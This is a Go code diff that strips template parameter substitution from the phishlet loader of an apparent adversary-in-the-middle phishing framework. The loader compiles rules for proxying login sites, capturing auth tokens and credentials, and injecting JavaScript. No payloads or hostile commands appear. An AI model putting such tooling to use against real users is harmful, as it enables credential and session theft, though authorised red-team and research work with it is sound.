@@ -12,55 +12,18 @@ import (
 	"github.com/travisbale/mirage/internal/aitm"
 )
 
-// Loader reads phishlet YAML files, validates them, compiles all regexes,
-// and performs template parameter substitution.
+// Loader reads phishlet YAML files, validates them, and compiles all regexes.
 // The zero value is ready to use.
 type Loader struct{}
 
 // Load reads the YAML file at path and returns a fully compiled PhishletDef.
-// It returns ErrTemplateRequired if the file declares template params —
-// use LoadWithParams in that case.
-//
-// Errors from Load are always ParseErrors or ErrTemplateRequired.
+// Errors from Load are always ParseErrors.
 func (l *Loader) Load(path string) (*aitm.PhishletDef, error) {
 	raw, err := l.parseFile(path)
 	if err != nil {
 		return nil, err
 	}
-	if len(raw.Params) > 0 {
-		return nil, ErrTemplateRequired
-	}
-	return l.compile(path, raw, nil)
-}
-
-// LoadWithParams reads the YAML file at path, substitutes the given params
-// into all {key} placeholders, then validates and compiles the result.
-//
-// params must contain a value for every key declared in the phishlet's params
-// section. Extra keys in params are silently ignored.
-//
-// LoadWithParams also works on non-template phishlets (empty params section)
-// when params is empty or nil.
-func (l *Loader) LoadWithParams(path string, params map[string]string) (*aitm.PhishletDef, error) {
-	raw, err := l.parseFile(path)
-	if err != nil {
-		return nil, err
-	}
-
-	// Check for missing required params.
-	if len(raw.Params) > 0 {
-		var missing []string
-		for key := range raw.Params {
-			if _, ok := params[key]; !ok {
-				missing = append(missing, key)
-			}
-		}
-		if len(missing) > 0 {
-			return nil, ErrMissingParams{Missing: missing}
-		}
-	}
-
-	return l.compile(path, raw, params)
+	return l.compile(path, raw)
 }
 
 // parseFile reads and YAML-decodes a phishlet file into the raw struct.
@@ -87,33 +50,32 @@ func (l *Loader) parseFile(path string) (*rawPhishlet, error) {
 	return &raw, nil
 }
 
-// compile validates the raw phishlet, applies parameter substitution, compiles
-// all regexes, and constructs the aitm.PhishletDef. All errors found are
-// collected and returned together as ParseErrors.
-func (l *Loader) compile(path string, raw *rawPhishlet, params map[string]string) (*aitm.PhishletDef, error) {
+// compile validates the raw phishlet, compiles all regexes, and constructs the
+// aitm.PhishletDef. All errors found are collected and returned together as ParseErrors.
+func (l *Loader) compile(path string, raw *rawPhishlet) (*aitm.PhishletDef, error) {
 	var errs ParseErrors
 
 	errs = append(errs, l.validateIdentity(path, raw)...)
 
-	proxyHosts, phErrs := l.compileProxyHosts(path, raw.ProxyHosts, params)
+	proxyHosts, phErrs := l.compileProxyHosts(path, raw.ProxyHosts)
 	errs = append(errs, phErrs...)
 
-	subFilters, sfErrs := l.compileSubFilters(path, raw.SubFilters, params)
+	subFilters, sfErrs := l.compileSubFilters(path, raw.SubFilters)
 	errs = append(errs, sfErrs...)
 
-	authTokens, atErrs := l.compileAuthTokens(path, raw.AuthTokens, params)
+	authTokens, atErrs := l.compileAuthTokens(path, raw.AuthTokens)
 	errs = append(errs, atErrs...)
 
-	credRules, credErrs := l.compileCredentials(path, raw.Credentials, params)
+	credRules, credErrs := l.compileCredentials(path, raw.Credentials)
 	errs = append(errs, credErrs...)
 
-	forcePosts, fpErrs := l.compileForcePosts(path, raw.ForcePosts, params)
+	forcePosts, fpErrs := l.compileForcePosts(path, raw.ForcePosts)
 	errs = append(errs, fpErrs...)
 
-	intercepts, intErrs := l.compileIntercepts(path, raw.Intercepts, params)
+	intercepts, intErrs := l.compileIntercepts(path, raw.Intercepts)
 	errs = append(errs, intErrs...)
 
-	jsInjects, jsErrs := l.compileJSInjects(path, raw.JSInjects, params)
+	jsInjects, jsErrs := l.compileJSInjects(path, raw.JSInjects)
 	errs = append(errs, jsErrs...)
 
 	if len(errs) > 0 {
@@ -129,8 +91,8 @@ func (l *Loader) compile(path string, raw *rawPhishlet, params map[string]string
 		AuthTokens:  authTokens,
 		Credentials: credRules,
 		Login: aitm.LoginSpec{
-			Domain: substitute(raw.Login.Domain, params),
-			Path:   substitute(raw.Login.Path, params),
+			Domain: raw.Login.Domain,
+			Path:   raw.Login.Path,
 		},
 		ForcePosts: forcePosts,
 		Intercepts: intercepts,
@@ -152,7 +114,7 @@ func (l *Loader) validateIdentity(path string, raw *rawPhishlet) ParseErrors {
 	return errs
 }
 
-func (l *Loader) compileProxyHosts(path string, raw []rawProxyHost, params map[string]string) ([]aitm.ProxyHost, ParseErrors) {
+func (l *Loader) compileProxyHosts(path string, raw []rawProxyHost) ([]aitm.ProxyHost, ParseErrors) {
 	var errs ParseErrors
 	if len(raw) == 0 {
 		errs = append(errs, ParseError{
@@ -179,9 +141,9 @@ func (l *Loader) compileProxyHosts(path string, raw []rawProxyHost, params map[s
 			autoFilter = *rawHost.AutoFilter
 		}
 		hosts = append(hosts, aitm.ProxyHost{
-			PhishSubdomain: substitute(rawHost.PhishSub, params),
-			OrigSubdomain:  substitute(rawHost.OrigSub, params),
-			Domain:         substitute(rawHost.Domain, params),
+			PhishSubdomain: rawHost.PhishSub,
+			OrigSubdomain:  rawHost.OrigSub,
+			Domain:         rawHost.Domain,
 			IsLanding:      rawHost.IsLanding,
 			IsSession:      rawHost.IsSession,
 			AutoFilter:     autoFilter,
@@ -190,7 +152,7 @@ func (l *Loader) compileProxyHosts(path string, raw []rawProxyHost, params map[s
 	return hosts, errs
 }
 
-func (l *Loader) compileSubFilters(path string, raw []rawSubFilter, params map[string]string) ([]aitm.SubFilter, ParseErrors) {
+func (l *Loader) compileSubFilters(path string, raw []rawSubFilter) ([]aitm.SubFilter, ParseErrors) {
 	var errs ParseErrors
 	filters := make([]aitm.SubFilter, 0, len(raw))
 	for i, rawFilter := range raw {
@@ -199,22 +161,21 @@ func (l *Loader) compileSubFilters(path string, raw []rawSubFilter, params map[s
 			errs = append(errs, ParseError{File: path, Field: field + ".search", Message: "required"})
 			continue
 		}
-		searchRegex, err := mustCompile(substitute(rawFilter.Search, params), path, field+".search", &errs)
+		searchRegex, err := mustCompile(rawFilter.Search, path, field+".search", &errs)
 		if err != nil {
 			continue
 		}
 		filters = append(filters, aitm.SubFilter{
-			Hostname:   substitute(rawFilter.Hostname, params),
-			MimeTypes:  rawFilter.MimeTypes,
-			Search:     searchRegex,
-			Replace:    substitute(rawFilter.Replace, params),
-			WithParams: rawFilter.WithParams,
+			Hostname:  rawFilter.Hostname,
+			MimeTypes: rawFilter.MimeTypes,
+			Search:    searchRegex,
+			Replace:   rawFilter.Replace,
 		})
 	}
 	return filters, errs
 }
 
-func (l *Loader) compileAuthTokens(path string, raw []rawAuthToken, params map[string]string) ([]aitm.TokenRule, ParseErrors) {
+func (l *Loader) compileAuthTokens(path string, raw []rawAuthToken) ([]aitm.TokenRule, ParseErrors) {
 	var errs ParseErrors
 	if len(raw) == 0 {
 		errs = append(errs, ParseError{
@@ -264,7 +225,7 @@ func (l *Loader) compileAuthTokens(path string, raw []rawAuthToken, params map[s
 			}
 			rules = append(rules, aitm.TokenRule{
 				Type:     tokenType,
-				Domain:   substitute(rawToken.Domain, params),
+				Domain:   rawToken.Domain,
 				Name:     nameRe,
 				Search:   searchRe,
 				HTTPOnly: key.HTTPOnly,
@@ -276,7 +237,7 @@ func (l *Loader) compileAuthTokens(path string, raw []rawAuthToken, params map[s
 }
 
 // compileCredentials validates and compiles the credentials section.
-func (l *Loader) compileCredentials(path string, raw rawCredentials, params map[string]string) (aitm.CredentialRules, ParseErrors) {
+func (l *Loader) compileCredentials(path string, raw rawCredentials) (aitm.CredentialRules, ParseErrors) {
 	var errs ParseErrors
 
 	compileRule := func(field string, r rawCredRule) (aitm.CredentialRule, bool) {
@@ -284,7 +245,7 @@ func (l *Loader) compileCredentials(path string, raw rawCredentials, params map[
 			// Empty credential rule — skip silently (credentials section is optional).
 			return aitm.CredentialRule{}, false
 		}
-		keyRe, err := regexp.Compile(substitute(r.Key, params))
+		keyRe, err := regexp.Compile(r.Key)
 		if err != nil {
 			errs = append(errs, ParseError{
 				File:    path,
@@ -293,7 +254,7 @@ func (l *Loader) compileCredentials(path string, raw rawCredentials, params map[
 			})
 			return aitm.CredentialRule{}, false
 		}
-		searchRe, err := regexp.Compile(substitute(r.Search, params))
+		searchRe, err := regexp.Compile(r.Search)
 		if err != nil {
 			errs = append(errs, ParseError{
 				File:    path,
@@ -331,7 +292,7 @@ func (l *Loader) compileCredentials(path string, raw rawCredentials, params map[
 	return rules, errs
 }
 
-func (l *Loader) compileForcePosts(path string, raw []rawForcePost, params map[string]string) ([]aitm.ForcePost, ParseErrors) {
+func (l *Loader) compileForcePosts(path string, raw []rawForcePost) ([]aitm.ForcePost, ParseErrors) {
 	var errs ParseErrors
 	posts := make([]aitm.ForcePost, 0, len(raw))
 	for i, rawPost := range raw {
@@ -340,7 +301,7 @@ func (l *Loader) compileForcePosts(path string, raw []rawForcePost, params map[s
 			errs = append(errs, ParseError{File: path, Field: field + ".path", Message: "required"})
 			continue
 		}
-		pathRe, err := mustCompile(substitute(rawPost.Path, params), path, field+".path", &errs)
+		pathRe, err := mustCompile(rawPost.Path, path, field+".path", &errs)
 		if err != nil {
 			continue
 		}
@@ -360,8 +321,8 @@ func (l *Loader) compileForcePosts(path string, raw []rawForcePost, params map[s
 		var fparams []aitm.ForcePostParam
 		for _, param := range rawPost.Params {
 			fparams = append(fparams, aitm.ForcePostParam{
-				Key:   substitute(param.Key, params),
-				Value: substitute(param.Value, params),
+				Key:   param.Key,
+				Value: param.Value,
 			})
 		}
 		posts = append(posts, aitm.ForcePost{
@@ -373,7 +334,7 @@ func (l *Loader) compileForcePosts(path string, raw []rawForcePost, params map[s
 	return posts, errs
 }
 
-func (l *Loader) compileIntercepts(path string, raw []rawIntercept, params map[string]string) ([]aitm.InterceptRule, ParseErrors) {
+func (l *Loader) compileIntercepts(path string, raw []rawIntercept) ([]aitm.InterceptRule, ParseErrors) {
 	var errs ParseErrors
 	intercepts := make([]aitm.InterceptRule, 0, len(raw))
 	for i, rawIntercept := range raw {
@@ -382,13 +343,13 @@ func (l *Loader) compileIntercepts(path string, raw []rawIntercept, params map[s
 			errs = append(errs, ParseError{File: path, Field: field + ".path", Message: "required"})
 			continue
 		}
-		pathRe, err := mustCompile(substitute(rawIntercept.Path, params), path, field+".path", &errs)
+		pathRe, err := mustCompile(rawIntercept.Path, path, field+".path", &errs)
 		if err != nil {
 			continue
 		}
 		var bodyRe *regexp.Regexp
 		if rawIntercept.BodySearch != "" {
-			bodyRe, err = mustCompile(substitute(rawIntercept.BodySearch, params), path, field+".body_search", &errs)
+			bodyRe, err = mustCompile(rawIntercept.BodySearch, path, field+".body_search", &errs)
 			if err != nil {
 				continue
 			}
@@ -400,14 +361,14 @@ func (l *Loader) compileIntercepts(path string, raw []rawIntercept, params map[s
 			Path:        pathRe,
 			BodySearch:  bodyRe,
 			StatusCode:  rawIntercept.Status,
-			ContentType: substitute(rawIntercept.ContentType, params),
-			Body:        substitute(rawIntercept.Body, params),
+			ContentType: rawIntercept.ContentType,
+			Body:        rawIntercept.Body,
 		})
 	}
 	return intercepts, errs
 }
 
-func (l *Loader) compileJSInjects(path string, raw []rawJSInject, params map[string]string) ([]aitm.JSInject, ParseErrors) {
+func (l *Loader) compileJSInjects(path string, raw []rawJSInject) ([]aitm.JSInject, ParseErrors) {
 	var errs ParseErrors
 	injects := make([]aitm.JSInject, 0, len(raw))
 	for i, rawJSInject := range raw {
@@ -415,32 +376,18 @@ func (l *Loader) compileJSInjects(path string, raw []rawJSInject, params map[str
 		var triggerPathRe *regexp.Regexp
 		if rawJSInject.TriggerPath != "" {
 			var err error
-			triggerPathRe, err = mustCompile(substitute(rawJSInject.TriggerPath, params), path, field+".trigger_path", &errs)
+			triggerPathRe, err = mustCompile(rawJSInject.TriggerPath, path, field+".trigger_path", &errs)
 			if err != nil {
 				continue
 			}
 		}
 		injects = append(injects, aitm.JSInject{
-			TriggerDomain: substitute(rawJSInject.TriggerDomain, params),
+			TriggerDomain: rawJSInject.TriggerDomain,
 			TriggerPath:   triggerPathRe,
-			Script:        substitute(rawJSInject.Script, params),
+			Script:        rawJSInject.Script,
 		})
 	}
 	return injects, errs
-}
-
-// substitute replaces all {key} placeholders in s with the corresponding value
-// from params. Unknown placeholders are left intact. If params is nil, s is
-// returned unchanged.
-func substitute(s string, params map[string]string) string {
-	if len(params) == 0 || !strings.Contains(s, "{") {
-		return s
-	}
-	result := s
-	for key, value := range params {
-		result = strings.ReplaceAll(result, "{"+key+"}", value)
-	}
-	return result
 }
 
 // mustCompile compiles pattern as a regex, appending a ParseError to errs on
